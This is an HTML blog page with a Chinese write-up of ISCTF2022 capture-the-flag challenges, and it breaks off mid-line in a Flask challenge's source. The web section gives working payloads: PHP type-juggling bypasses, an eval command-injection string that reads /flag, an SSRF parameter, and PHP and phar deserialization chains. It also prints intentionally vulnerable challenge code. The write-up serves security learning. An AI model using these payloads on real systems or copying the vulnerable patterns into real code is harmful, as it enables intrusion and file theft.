@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            ISCTF2022
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">ISCTF2022</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2022-11-03
+                        </span>
+                        
+                            <span id="/2022/11/03/ISCTF2022/" class="leancloud_visitors" data-flag-title="ISCTF2022">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2022/11/03/ISCTF2022/"></span>
+                        </span>  
+                    </p>
+                    
+                    
+                        
+                            <span class="tag-color">CTF比赛</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h2 id="ISCTF"><a href="#ISCTF" class="headerlink" title="ISCTF"></a>ISCTF</h2><pre><code>其实感觉更像MiscISCTF
+</code></pre>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h5 id="呜呜呜我的md5脏了"><a href="#呜呜呜我的md5脏了" class="headerlink" title="呜呜呜我的md5脏了"></a>呜呜呜我的md5脏了</h5><p>附件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g0at无意间发现了被打乱的flag：I&#123;i?8Sms??Cd_1?T51??F_1?&#125;</span><br><span class="line">但是好像缺了不少东西，flag的md5值已经通过py交易得到了：88875458bdd87af5dd2e3c750e534741</span><br></pre></td></tr></table></figure>
+<p>很容易可以看出<code>ISCTF</code>相隔位置都是五个,直接<a href=http://moersima.00cha.net/shanlan.asp>栅栏密码</a>解密一下</p>
+<p>偏移量5 <code>ISCTF&#123;md5_is_11??1??8???&#125;</code></p>
+<p>猜测肯定</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">for q in range(0,10):</span><br><span class="line">    for w in range(0,10):</span><br><span class="line">        for e in range(0,10):</span><br><span class="line">            for r in range(0,10):  </span><br><span class="line">                for t in range(0,10):</span><br><span class="line">                    for y in range(0,10):</span><br><span class="line">                        for u in range(0,10):</span><br><span class="line">                            m=hashlib.md5()</span><br><span class="line">                            a = &#x27;ISCTF&#123;md5_is_11&#x27;+&#x27;&#123;&#125;&#123;&#125;1&#123;&#125;&#123;&#125;8&#123;&#125;&#123;&#125;&#123;&#125;&#x27;.format(q,w,e,r,t,y,u)+&#x27;&#125;&#x27;</span><br><span class="line">                            m.update(a.encode(&quot;utf8&quot;))</span><br><span class="line">                            des=m.hexdigest()</span><br><span class="line">                            if &#x27;88875458bdd87af5dd2e3c750e534741&#x27; in des :</span><br><span class="line">                                print (a)</span><br><span class="line">                                exit()</span><br><span class="line">                            else :</span><br><span class="line">                                print(&#x27;-&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h5 id="韩信点兵"><a href="#韩信点兵" class="headerlink" title="韩信点兵"></a>韩信点兵</h5><p>了解了<code>^</code>这个运算符号,就能写出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">key = 63311</span><br><span class="line">def encrypt(text):</span><br><span class="line">	return [(((ord(text)&lt;&lt;4)&amp;0xff) + ((ord(text)&gt;&gt;4)&amp;0xff))^key]</span><br><span class="line"></span><br><span class="line">payload = 0</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">str2 = &#x27;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_&#123;-&#125;&#x27;</span><br><span class="line">f = open(&quot;output.enc&quot;,&quot;r&quot;).read().split(&quot;\n&quot;)</span><br><span class="line">for str1 in f :</span><br><span class="line">    num = re.findall(&quot;\d+&quot;,str1)</span><br><span class="line">    for k in range(0,4):</span><br><span class="line">        num[k] = int(num[k])</span><br><span class="line">    for zimu in str2 :</span><br><span class="line">        lis = encrypt(zimu)</span><br><span class="line">        p1 = num[0]</span><br><span class="line">        p2 = num[1]</span><br><span class="line">        for k in lis:</span><br><span class="line">            jiaodui1 = k%p1</span><br><span class="line">            jiaodui2 = k%p2</span><br><span class="line">        if num[2] == jiaodui1 and num[3] == jiaodui2 :</span><br><span class="line">            flag += zimu</span><br><span class="line">            break</span><br><span class="line">    print (flag)</span><br></pre></td></tr></table></figure>
+<p>直接贴脚本吧</p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><ol>
+<li><b>EASY-PHP01 </b>:会传参就可以写</li>
+<li><b>FakeWeb</b>:抓包<br>只要If-None-Match和ETag一样才会弹出正确的web页面<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它的原理是这样的，当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag返回给浏览器，浏览器把&quot;3f80f-1b6-3e1cb03b&quot; 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: &quot;3f80f-1b6-3e1cb03b&quot;的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h5 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;flag&#123;need_time_to_change&#125;&quot;;</span><br><span class="line">include_once(&quot;config.php&quot;);</span><br><span class="line">$YOUR_NAME = $_GET[&quot;NAME&quot;];</span><br><span class="line">$GET1 = $_POST[&quot;GET1&quot;];</span><br><span class="line">$GET2 = $_POST[&quot;GET2&quot;];</span><br><span class="line">$POST1 = $_GET[&quot;P0ST1&quot;];</span><br><span class="line">$POST2 = $_GET[&quot;P0ST2&quot;];</span><br><span class="line">if (isset($YOUR_NAME))&#123;</span><br><span class="line">    echo $YOUR_NAME.&quot;,请开始你的答题。&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;做题前请告诉我你是小蓝鲨吗？&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">if (is_numeric($POST1))&#123;</span><br><span class="line">    if ($_GET[&quot;P0ST1&quot;] != $_GET[&quot;P0ST2&quot;])&#123;</span><br><span class="line">        </span><br><span class="line">        if (($_GET[&quot;P0ST1&quot;]) == md5($_GET[&quot;P0ST2&quot;]))&#123;</span><br><span class="line"></span><br><span class="line">                $f1=$flag1;</span><br><span class="line">                echo &quot;小蓝鲨成功一半&quot;.$f1;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[0-9]*$/&#x27;,$GET1)) &#123;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if( $GET1 == 0 )&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.&quot;前面的出来了吗？&quot;;</span><br><span class="line">        if(is_numeric($GET2))&#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        if($GET2 &gt; 678)&#123;</span><br><span class="line">            echo &quot;答案就在眼前？&quot;.&quot;&lt;br&gt;&quot;.$YOUR_NAME.&quot;,你觉得这是flag吗？&quot;.&quot;&lt;br&gt;&quot;;     </span><br><span class="line">            $Ag=base64_encode($flag2);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$flag666 = $f1.$Ag;</span><br><span class="line">echo $flag666;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>直接上<code>payload</code>吧,这题唯一自闭的是，post那个o是零</p>
+<p><code>payload = ?NAME=123&amp;P0ST1=0e462097431906509019562988736854&amp;P0ST2=240610708</code><br>post <code>GET1=0a&amp;GET2=777a</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/jjjj.png"></p>
+<h5 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ERROR);</span><br><span class="line">$str=$_GET[&#x27;str&#x27;];</span><br><span class="line">$pattern = &quot;#\\\\\\\\/Ilikeisctf#&quot;;</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match($pattern,$str,$arr))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;good try!&quot;;</span><br><span class="line">    $num=$_GET[&#x27;num&#x27;];</span><br><span class="line">    if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo &quot;come on!!!&quot;;</span><br><span class="line">        if($num==&#x27;36&#x27;&amp;isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;hacker!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>第一个urlencode<br>第二个<code>trim()</code>和<code>is_numberic()</code>导致的函数判断错误<code>%0c</code>绕过</p>
+<p>payload <code>?str=%23%5C%5C%5C%5C%5C%5C%5C%5C%2FIlikeisctf%23&amp;%20num=%0c36&amp;cmd=system(%27cat%20/flag%27);</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/ISflag1.png"></p>
+<h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><p>直接要我们点flag.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E6%88%AA%E5%9B%BE20221103164712.png"></p>
+<p>要我们从本地传<br>F12 看一下网页源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;urls&#x27;]))&#123;</span><br><span class="line">	$urls = $_GET[&#x27;urls&#x27;];</span><br><span class="line">	$url_host = parse_url($urls,PHP_URL_HOST);</span><br><span class="line">	//Do something~~~~</span><br><span class="line">	curl_get($urls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传<code>urls</code><br>payload &#x3D; <code>?urls=127.0.0.1%20/flag.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/ISflag2.png"></p>
+<h5 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class mouse</span><br><span class="line">&#123;</span><br><span class="line">public $v;</span><br><span class="line">   public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Good. You caught the mouse:&quot;;</span><br><span class="line">        include($this-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;dog();</span><br><span class="line">        $this-&gt;b = $this-&gt;c;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    public function dog()</span><br><span class="line">    &#123; </span><br><span class="line">        $this-&gt;a = &quot;I&#x27;m a vicious dog, Kitty&quot;;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&quot;cat&quot;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>需要绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function dog()</span><br><span class="line">    &#123; </span><br><span class="line">        $this-&gt;a = &quot;I&#x27;m a vicious dog, Kitty&quot;;    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>利用php取地址绕过<br>inlcude 利用伪协议读一下</p>
+<p>payload </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class mouse</span><br><span class="line">&#123;</span><br><span class="line">public $v;</span><br><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Good. You caught the mouse:&quot;;</span><br><span class="line">        include($this-&gt;v);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line">    public function dog()</span><br><span class="line">    &#123; </span><br><span class="line">        $this-&gt;a = &quot;I&#x27;m a vicious dog, Kitty&quot;;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$q = new mouse();</span><br><span class="line">$q-&gt;v = php://filter/read=convert.base64-encode/resource=flag.php;</span><br><span class="line">$w = new cat();</span><br><span class="line">$w-&gt;b = &amp;$w-&gt;a ;</span><br><span class="line">$w-&gt;c = $q;</span><br><span class="line">echo serialize($w);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/webflag.png"></p>
+<h5 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h5><p>直接有源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;class.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;img_name&#x27;]))&#123;</span><br><span class="line">    $down = new check_img();</span><br><span class="line">    echo $down-&gt;img_check();</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">        $up = new upload();</span><br><span class="line">        echo $up-&gt;start();</span><br><span class="line">        &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class upload&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $size;</span><br><span class="line">    public $Valid_ext;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;filename = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $this-&gt;ext = end(explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]));</span><br><span class="line">        $this-&gt;size = $_FILES[&quot;file&quot;][&quot;size&quot;] / 1024;</span><br><span class="line">        $this-&gt;Valid_ext = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function start()&#123;</span><br><span class="line">        return $this-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function check()&#123;</span><br><span class="line">        if(file_exists($this-&gt;filename))&#123;</span><br><span class="line">            return &quot;Image already exsists&quot;;</span><br><span class="line">        &#125;elseif(!in_array($this-&gt;ext, $this-&gt;Valid_ext))&#123;</span><br><span class="line">            return &quot;Only Image Can Be Uploaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $this-&gt;move();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function move()&#123;</span><br><span class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$this-&gt;filename);</span><br><span class="line">        return &quot;Upload succsess!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class check_img&#123;</span><br><span class="line">    public $img_name;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;img_name = $_GET[&#x27;img_name&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function img_check()&#123;</span><br><span class="line">        if(file_exists($this-&gt;img_name))&#123;</span><br><span class="line">            return &quot;Image exsists&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return &quot;Image not exsists&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用<code>if(file_exists($this-&gt;img_name))</code>传img_name传phar文件<br>phar反序列化，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class upload&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $size;</span><br><span class="line">    public $Valid_ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot; __HALT_COMPILER(); &quot;); //设置stub</span><br><span class="line">$a = new upload();</span><br><span class="line">$a-&gt;filename = &#x27;/flag&#x27;;</span><br><span class="line">$o = $a;</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest(存入的$0会被序列化储存)</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>生成phar文件上传<br><code>phar:\\上传文件位置</code></p>
+<h5 id="eazy-onlineshell-and-crazy-onlineshell"><a href="#eazy-onlineshell-and-crazy-onlineshell" class="headerlink" title="eazy-onlineshell and crazy-onlineshell"></a>eazy-onlineshell and crazy-onlineshell</h5><p><b>1. eazy-onlineshell</b></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这题给了个&quot;没有回显的shell呢，该怎么利用这shell呢&quot;</span><br></pre></td></tr></table></figure>
+<p>我一直以为是反弹shell但是无论怎么样,一直没有回显<br>bash的反弹和python的反弹shell都没有回显</p>
+<p>简单看一下题目,要我看备份,我直接扫目录<br>查看<code>www.zip</code><br>拿到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &quot;Try to access the /rce&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/www.zip&quot;)</span><br><span class="line">def return_SourceCode():</span><br><span class="line">    with open(&quot;./app.py&quot;, &quot;r&quot;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/rce&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def action_rce():</span><br><span class="line">    if flask.request.method == &quot;GET&quot;:</span><br><span class="line">        return &quot;Why not try to search the backup&quot;</span><br><span class="line">    elif flask.request.method == &quot;POST&quot;:</span><br><span class="line">        action = flask.request.form[&quot;act&quot;]</span><br><span class="line">        with open(&quot;/app/temp.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">            f.write(action[1:-1])</span><br><span class="line">        res = subprocess.run([&quot;/bin/bash&quot;, &quot;/app/temp.sh&quot;], stdout=subprocess.PIPE)</span><br><span class="line">        # print(res)</span><br><span class="line">        